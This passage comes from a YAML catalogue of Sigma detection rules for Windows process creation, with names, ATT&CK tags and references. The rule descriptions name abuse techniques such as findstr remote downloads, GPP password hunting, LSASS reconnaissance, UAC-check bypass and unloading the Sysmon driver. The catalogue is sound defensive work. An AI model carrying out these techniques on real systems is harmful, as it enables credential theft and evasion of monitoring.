  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://labs.sentinelone.com/meteorexpress-mysterious-wiper-paralyzes-iranian-trains-with-epic-troll
  - https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/
  false_positives:
  - System administrator Usage
  notes: ''
- detection_id: 949f1ffb-6e85-4f00-ae1e-c3c5b190d605
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_explorer_break_process_tree.yml
  name: Explorer Process Tree Break
  description: 'Detects a command line process that uses explorer.exe to launch arbitrary
    commands or binaries,

    which is similar to cmd.exe /c, only it breaks the process tree and makes its
    parent a new instance of explorer spawning from "svchost"

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://twitter.com/CyberRaiju/status/1273597319322058752
  - https://twitter.com/bohops/status/1276357235954909188?s=12
  - https://twitter.com/nas_bench/status/1535322450858233858
  - https://securityboulevard.com/2019/09/deobfuscating-ostap-trickbots-34000-line-javascript-downloader/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c3d76afc-93df-461e-8e67-9b2bad3f2ac4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_explorer_folder_shortcut_via_shell_binary.yml
  name: File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell
  description: 'Detects the initial execution of "cmd.exe" which spawns "explorer.exe"
    with the appropriate command line arguments for opening the "My Computer" folder.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1135
  tags:
  - attack.discovery
  - attack.t1135
  time_window: ''
  references:
  - https://ss64.com/nt/shell.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 534f2ef7-e8a2-4433-816d-c91bccde289b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_explorer_nouaccheck.yml
  name: Explorer NOUACCHECK Flag
  description: Detects suspicious starts of explorer.exe that use the /NOUACCHECK
    flag that allows to run all sub processes of that newly started explorer.exe without
    any UAC checks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548.002
  time_window: ''
  references:
  - https://twitter.com/ORCA6665/status/1496478087244095491
  false_positives:
  - Domain Controller User Logon
  - Unknown how many legitimate software products use that method
  notes: ''
- detection_id: 587254ee-a24b-4335-b3cd-065c0f1f4baa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_findstr_download.yml
  name: Remote File Download Via Findstr.EXE
  description: 'Detects execution of "findstr" with specific flags and a remote share
    path. This specific set of CLI flags would allow "findstr" to download the content
    of the file located on the remote share as described in the LOLBAS entry.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1218
  - T1552.001
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.command-and-control
  - attack.t1218
  - attack.t1564.004
  - attack.t1552.001
  - attack.t1105
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Findstr/
  - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
  false_positives:
  - Unknown
  notes: ''
- detection_id: 91a2c315-9ee6-4052-a853-6f6a8238f90d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_findstr_gpp_passwords.yml
  name: Findstr GPP Passwords
  description: Look for the encrypted cpassword value within Group Policy Preference
    files on the Domain Controller. This value can be decrypted with gpp-decrypt.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.006
  tags:
  - attack.credential-access
  - attack.t1552.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.006/T1552.006.md#atomic-test-1---gpp-passwords-findstr
  false_positives:
  - Unknown
  notes: ''
- detection_id: 33339be3-148b-4e16-af56-ad16ec6c7e7b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_findstr_lnk.yml
  name: Findstr Launching .lnk File
  description: Detects usage of findstr to identify and execute a lnk file as seen
    within the HHS redirect attack
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027.003
  - T1036
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.t1202
  - attack.t1027.003
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/hhsgov-open-redirect-used-by-coronavirus-phishing-to-spread-malware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: fe63010f-8823-4864-a96b-a7b4a0f7b929
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_findstr_lsass.yml
  name: LSASS Process Reconnaissance Via Findstr.EXE
  description: Detects findstring commands that include the keyword lsass, which indicates
    recon actviity for the LSASS process PID
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.006
  tags:
  - attack.credential-access
  - attack.t1552.006
  time_window: ''
  references:
  - https://blog.talosintelligence.com/2022/08/recent-cyber-attack.html?m=1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 47e4bab7-c626-47dc-967b-255608c9a920
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_findstr_recon_everyone.yml
  name: Permission Misconfiguration Reconnaissance Via Findstr.EXE
  description: 'Detects usage of findstr with the "EVERYONE" or "BUILTIN" keywords.

    This was seen being used in combination with "icacls" and other utilities to spot
    misconfigured files or folders permissions.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.006
  tags:
  - attack.credential-access
  - attack.t1552.006
  time_window: ''
  references:
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ccb5742c-c248-4982-8c5c-5571b9275ad3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_findstr_recon_pipe_output.yml
  name: Recon Command Output Piped To Findstr.EXE
  description: 'Detects the execution of a potential recon command where the results
    are piped to "findstr". This is meant to trigger on inline calls of "cmd.exe"
    via the "/c" or "/k" for example.

    Attackers often time use this technique to extract specific information they require
    in their reconnaissance phase.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1057
  tags:
  - attack.discovery
  - attack.t1057
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/02cb591f75064ffe1e0df9ac3ed5972a2e491c97/atomics/T1057/T1057.md#atomic-test-6---discover-specific-process---tasklist
  - https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf
  - https://www.trendmicro.com/en_us/research/22/d/spring4shell-exploited-to-deploy-cryptocurrency-miners.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4fe074b4-b833-4081-8f24-7dcfeca72b42
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_findstr_security_keyword_lookup.yml
  name: Security Tools Keyword Lookup Via Findstr.EXE
  description: 'Detects execution of "findstr" to search for common names of security
    tools. Attackers often pipe the results of recon commands such as "tasklist" or
    "whoami" to "findstr" in order to filter out the results.

    This detection focuses on the keywords that the attacker might use as a filter.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1518.001
  tags:
  - attack.discovery
  - attack.t1518.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/987e3ca988ae3cff4b9f6e388c139c05bf44bbb8/atomics/T1518.001/T1518.001.md#atomic-test-1---security-software-discovery
  - https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/
  - https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 04936b66-3915-43ad-a8e5-809eadfd1141
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_findstr_subfolder_search.yml
  name: Insensitive Subfolder Search Via Findstr.EXE
  description: 'Detects execution of findstr with the "s" and "i" flags for a "subfolder"
    and "insensitive" search respectively. Attackers sometimes leverage this built-in
    utility to search the system for interesting files or filter through results of
    commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1218
  - T1552.001
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.command-and-control
  - attack.t1218
  - attack.t1564.004
  - attack.t1552.001
  - attack.t1105
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Findstr/
  - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
  false_positives:
  - Administrative or software activity
  notes: ''
- detection_id: 37db85d1-b089-490a-a59a-c7b6f984f480
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_findstr_sysmon_discovery_via_default_altitude.yml
  name: Sysmon Discovery Via Default Driver Altitude Using Findstr.EXE
  description: Detects usage of "findstr" with the argument "385201". Which could
    indicate potential discovery of an installed Sysinternals Sysmon service using
    the default driver altitude (even if the name is changed).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1518.001
  tags:
  - attack.discovery
  - attack.t1518.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1518.001/T1518.001.md#atomic-test-5---security-software-discovery---sysmon-service
  false_positives:
  - Unknown
  notes: ''
- detection_id: af491bca-e752-4b44-9c86-df5680533dbc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_finger_execution.yml
  name: Finger.EXE Execution
  description: 'Detects execution of the "finger.exe" utility.

    Finger.EXE or "TCPIP Finger Command" is an old utility that is still present on
    modern Windows installation. It Displays information about users on a specified
    remote computer (typically a UNIX computer) that is running the finger service
    or daemon.

    Due to the old nature of this utility and the rareness of machines having the
    finger service. Any execution of "finger.exe" can be considered "suspicious" and
    worth investigating.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://twitter.com/bigmacjpg/status/1349727699863011328?s=12
  - https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/
  - http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt
  false_positives:
  - Admin activity (unclear what they do nowadays with finger.exe)
  notes: ''
- detection_id: 4931188c-178e-4ee7-a348-39e8a7a56821
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_fltmc_unload_driver.yml
  name: Filter Driver Unloaded Via Fltmc.EXE
  description: Detect filter driver unloading activity via fltmc.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070
  - T1562
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1070
  - attack.t1562
  - attack.t1562.002
  time_window: ''
  references:
  - https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon
  - https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4d7cda18-1b12-4e52-b45c-d28653210df8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_fltmc_unload_driver_sysmon.yml
  name: Sysmon Driver Unloaded Via Fltmc.EXE
  description: Detects possible Sysmon filter driver unloaded via fltmc.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070
  - T1562
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1070
  - attack.t1562
  - attack.t1562.002
  time_window: ''
  references:
  - https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f53714ec-5077-420e-ad20-907ff9bb2958
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_forfiles_child_process_masquerading.yml
  name: Forfiles.EXE Child Process Masquerading
  description: 'Detects the execution of "forfiles" from a non-default location, in
    order to potentially spawn a custom "cmd.exe" from the current working directory.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2023/12/31/1-little-known-secret-of-forfiles-exe/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9aa5106d-bce3-4b13-86df-3a20f1d5cf0b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_forfiles_proxy_execution_.yml
  name: Forfiles Command Execution
  description: 'Detects the execution of "forfiles" with the "/c" flag.

    While this is an expected behavior of the tool, it can be abused in order to proxy
    execution through it with any binary.

    Can be used to bypass application whitelisting.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Forfiles/
  - https://pentestlab.blog/2020/07/06/indirect-command-execution/
  false_positives:
  - Legitimate use via a batch script or by an administrator.
  notes: ''
- detection_id: 9fb6b26e-7f9e-4517-a48b-8cac4a1b6c60
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_format_uncommon_filesystem_load.yml
  name: Uncommon FileSystem Load Attempt By Format.com
  description: 'Detects the execution of format.com with an uncommon filesystem selection
    that could indicate a defense evasion activity in which "format.com" is used to
    load malicious DLL files or other programs.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1477925112561209344
  - https://twitter.com/wdormann/status/1478011052130459653?s=20
  false_positives:
  - Unknown
  notes: ''
- detection_id: b96b2031-7c17-4473-afe7-a30ce714db29
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_fsi_fsharp_code_execution.yml
  name: Use of FSharp Interpreters
  description: 'Detects the execution of FSharp Interpreters "FsiAnyCpu.exe" and "FSi.exe"

    Both can be used for AWL bypass and to execute F# code via scripts or inline.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac
  - https://bohops.com/2020/11/02/exploring-the-wdac-microsoft-recommended-block-rules-part-ii-wfc-fsi/
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/FsiAnyCpu/
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Fsi/
  false_positives:
  - Legitimate use by a software developer.
  notes: ''
- detection_id: 63de06b9-a385-40b5-8b32-73f2b9ef84b6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_fsutil_drive_enumeration.yml
  name: Fsutil Drive Enumeration
  description: Attackers may leverage fsutil to enumerated connected drives.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1120
  tags:
  - attack.discovery
  - attack.t1120
  time_window: ''
  references:
  - Turla has used fsutil fsinfo drives to list connected drives.
  - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/discovery_peripheral_device.toml
  false_positives:
  - Certain software or administrative tasks may trigger false positives.
  notes: ''
- detection_id: c0b2768a-dd06-4671-8339-b16ca8d1f27f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_fsutil_symlinkevaluation.yml
  name: Potentially Suspicious NTFS Symlink Behavior Modification
  description: 'Detects the modification of NTFS symbolic link behavior using fsutil,
    which could be used to enable remote to local or remote to remote symlinks for
    potential attacks.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1222.001
  tags:
  - attack.execution
  - attack.t1059
  - attack.defense-evasion
  - attack.t1222.001
  time_window: ''
  references:
  - https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware
  - https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/fsutil-behavior
  - https://thedfirreport.com/2025/06/30/hide-your-rdp-password-spray-leads-to-ransomhub-deployment/
  false_positives:
  - Legitimate usage, investigate the parent process and context to determine if benign.
  notes: ''
- detection_id: add64136-62e5-48ea-807e-88638d02df1e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_fsutil_usage.yml
  name: Fsutil Suspicious Invocation
  description: 'Detects suspicious parameters of fsutil (deleting USN journal, configuring
    it with small size, etc).

    Might be used by ransomwares during the attack (seen by NotPetya and others).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1070
  - T1485
  tags:
  - attack.defense-evasion
  - attack.impact
  - attack.t1070
  - attack.t1485
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070/T1070.md
  - https://eqllib.readthedocs.io/en/latest/analytics/c91f422a-5214-4b17-8664-c5fcf115c0a2.html
  - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md
  - https://blog.cluster25.duskrise.com/2023/05/22/back-in-black-blackbyte-nt
  false_positives:
  - Admin activity
  - Scripts and administrative tools used in the monitored environment
  notes: ''
- detection_id: 06b401f4-107c-4ff9-947f-9ec1e7649f1e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ftp_arbitrary_command_execution.yml
  name: Potential Arbitrary Command Execution Via FTP.EXE
  description: Detects execution of "ftp.exe" script with the "-s" or "/s" flag and
    any child processes ran by "ftp.exe".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1202
  tags:
  - attack.execution
  - attack.t1059
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Ftp/
  false_positives:
  - Unknown
  notes: ''
- detection_id: eee00933-a761-4cd0-be70-c42fe91731e7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_gfxdownloadwrapper_arbitrary_file_download.yml
  name: Arbitrary File Download Via GfxDownloadWrapper.EXE
  description: Detects execution of GfxDownloadWrapper.exe with a URL as an argument
    to download file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/HonorableMentions/GfxDownloadWrapper/
  false_positives:
  - Unknown
  notes: ''
- detection_id: aef9d1f1-7396-4e92-a927-4567c7a495c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_git_susp_clone.yml
  name: Suspicious Git Clone
  description: Detects execution of "git" in order to clone a remote repository that
    contain suspicious keywords which might be suspicious
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1593.003
  tags:
  - attack.reconnaissance
  - attack.t1593.003
  time_window: ''
  references:
  - https://gist.githubusercontent.com/MichaelKoczwara/12faba9c061c12b5814b711166de8c2f/raw/e2068486692897b620c25fde1ea258c8218fe3d3/history.txt
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5bac7a56-da88-4c27-922e-c81e113b20cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_github_self_hosted_runner.yml
  name: Github Self-Hosted Runner Execution
  description: 'Detects GitHub self-hosted runners executing workflows on local infrastructure
    that could be abused for persistence and code execution.

    Shai-Hulud is an npm supply chain worm targeting CI/CD environments.

    It installs runners on compromised systems to maintain access after credential
    theft, leveraging their access to secrets and internal networks.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1071
  - T1102.002
  tags:
  - attack.command-and-control
  - attack.t1102.002
  - attack.t1071
  time_window: ''
  references:
  - https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/
  - https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/
  false_positives:
  - Legitimate GitHub self-hosted runner installations on designated CI/CD infrastructure
  - Authorized runner deployments by DevOps/Platform teams following change management
  - Scheduled runner updates or reconfigurations on existing build agents
  - Self-hosted runners that follow expected/known naming patterns
  - Installation via expected/known configuration management tools (reflected mostly
    as parent process name)
  notes: ''
- detection_id: 84b1ecf9-6eff-4004-bafb-bae5c0e251b2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_googleupdate_susp_child_process.yml
  name: Potentially Suspicious GoogleUpdate Child Process
  description: Detects potentially suspicious child processes of "GoogleUpdate.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 037dcd71-33a8-4392-bb01-293c94663e5a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_gpg4win_decryption.yml
  name: File Decryption Using Gpg4win
  description: Detects usage of Gpg4win to decrypt files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html
  - https://www.gpg4win.de/documentation.html
  - https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 550bbb84-ce5d-4e61-84ad-e590f0024dcd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_gpg4win_encryption.yml
  name: File Encryption Using Gpg4win
  description: Detects usage of Gpg4win to encrypt files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html
  - https://www.gpg4win.de/documentation.html
  - https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 77df53a5-1d78-4f32-bc5a-0e7465bd8f41
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_gpg4win_portable_execution.yml
  name: Portable Gpg.EXE Execution
  description: Detects the execution of "gpg.exe" from uncommon location. Often used
    by ransomware and loaders to decrypt/encrypt data.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  tags:
